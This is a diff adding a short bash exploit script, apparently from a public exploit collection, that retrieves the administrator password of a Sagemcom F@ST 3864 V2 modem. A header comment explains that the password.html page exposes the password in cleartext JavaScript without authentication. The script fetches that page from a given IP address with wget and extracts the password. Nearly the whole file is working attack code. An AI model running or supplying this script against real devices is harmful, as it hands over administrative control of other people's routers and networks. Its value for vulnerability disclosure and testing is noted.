@@ -1,0 +1,23 @@
+#!/bin/bash
+#########################################
+# Exploit Title: Sagemcom 3864 V2 get admin password
+# Date 2015-08-15
+# Author: Cade Bull
+# Software Link: null
+# Tested on: Sagemcom F@ST 3864 V2
+# Version: 7.253.2_F3864V2_Optus
+#########################################
+
+# The sagemcom modem does not authenticate users when requesting pages, only whilst posting forms
+# the password.html page loads the admin password in clear text and stores it in Javascript, which is viewable without any credentials
+ 
+if [ "$1" != "" ]
+then
+	IP_ADDRESS="$1"
+else
+	echo "Usage : $0 IP_ADDRESS"
+	exit 1
+fi
+ 
+USER_PASSWORD=`wget http://$IP_ADDRESS/password.html -t 1 -q -O -  | grep "pwdAdmin" | tr " = " "\n" | grep "'" | tr -d "';" `
+echo "admin password = $USER_PASSWORD"
